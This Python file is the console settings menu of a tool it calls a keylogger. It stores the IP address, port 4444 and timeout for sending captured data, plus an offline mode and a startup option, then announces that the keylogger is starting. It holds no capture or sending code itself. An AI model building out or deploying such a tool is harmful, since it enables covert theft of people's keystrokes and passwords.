import os
import json
import time
from pystyle import Colors


FILE = "settings.json"

def isNumber(n):  # checks if the input is a number
    try:
        int(n)
        return True
    except ValueError:
        return False


def choices():
    zero_or_one = input(f"{Colors.green}Yes [1] {Colors.orange}No [0]: {Colors.yellow}")
    while not isNumber(zero_or_one) or int(zero_or_one) > 1 or int(zero_or_one) < 0:
        zero_or_one = input(f"{Colors.green}Yes [1] {Colors.orange}No [0]: {Colors.yellow}")

    if zero_or_one == "0":
        return False
    else:
        return True


def writeSettings():
    settings = {
        "timeout": 10,
        "ipaddress": "0.0.0.0",
        "port": 4444,
        "offlinekl": False,
        "runOnStartup": True
    }
    setting_file = open(FILE, "w")
    setting_file.write(json.dumps(settings))
    setting_file.close()

    return True


def editSettings(setting, value):
    setting_file = open(FILE, "r")
    settings = json.loads(setting_file.read())
    setting_file.close()
    settings_list = ["timeout", "ipaddress", "port", "offlinekl", "runOnStartup"]

    settings[settings_list[int(setting)]] = value

    setting_file = open(FILE, "w")
    setting_file.write(json.dumps(settings))
    setting_file.close()

    return True


def toRunOnStartup():
    settings = open(FILE, "r")
    try:
        runonstartup = json.loads(settings.read())
        if runonstartup["runOnStartup"] is False:
            return True
        else:
            return False
    except json.decoder.JSONDecodeError:
        print(f"{Colors.red}[!] An error occurred when reading the settings, did you change anything? \U0001F914 {Colors.white}")
        exit(-1)


def fileExists():
    try:
        open(FILE, "r")
        return True
    except FileNotFoundError:
        return False


if __name__ == "__main__":
    while True:
        os.system("cls")
        if not fileExists():
            print("Creating the settings file...")
            writeSettings()

        if toRunOnStartup():
            print(f"{Colors.red}[!] Not enabled to launch the settings window \U0001F610")
            print(f"{Colors.orange}[i] If you want to change this setting, open the 'settings.json' file and change the 'runOnStartup' option to true \U0001F642 {Colors.white}")
            break

        text = f"""        
{Colors.blue}[0] Timeout when sending data (default 10s) \U0001F55B	
{Colors.yellow}[1] IP address (default 0.0.0.0) \U0001F51F	
{Colors.orange}[2] Port (default 1024) \U0001F51F		
{Colors.cyan}[3] Offline keylogger (default 0) \U0001F6AB
{Colors.gray}[4] Run this window on application startup (default 1) \U0001F44D	
{Colors.purple}[5] Close settings and run the keylogger \U0000274C

{Colors.white}[Enter] Exit{Colors.white}
> """
        choice = input(text)

        if not choice:
            exit(0)

        while not isNumber(choice) or int(choice) > 5 or int(choice) < 0:
            os.system("cls")
            print(f"{Colors.red}[!] Wrong choice{Colors.white}")
            choice = input(text)

        os.system("cls")
        if choice != "5":
            if choice == "0":
                timeout = input("Timeout (s): ")
                if editSettings(choice, int(timeout)):
                    print(f"{Colors.green}Success{Colors.white} \U0001F919")
            elif choice == "1":
                ipaddress = input("Enter ip address: ")
                if editSettings(choice, ipaddress):
                    print(f"{Colors.green}Success{Colors.white} \U0001F919")
            elif choice == "2":
                port = input("Enter a port: ")
                if editSettings(choice, int(port)):
                    print(f"{Colors.green}Success{Colors.white} \U0001F919")
            elif choice == "3":
                if choices():
                    offlinekl = True
                else:
                    offlinekl = False

                if editSettings(choice, offlinekl):
                    print(f"{Colors.green}Success{Colors.white} \U0001F919")
            elif choice == "4":
                if choices():
                    runOnStartup = True
                else:
                    runOnStartup = False

                if editSettings(choice, runOnStartup):
                    print(f"{Colors.green}Success{Colors.white} \U0001F919")

            time.sleep(2)

        else:
            break

print(f"{Colors.yellow}Keylogger is starting")
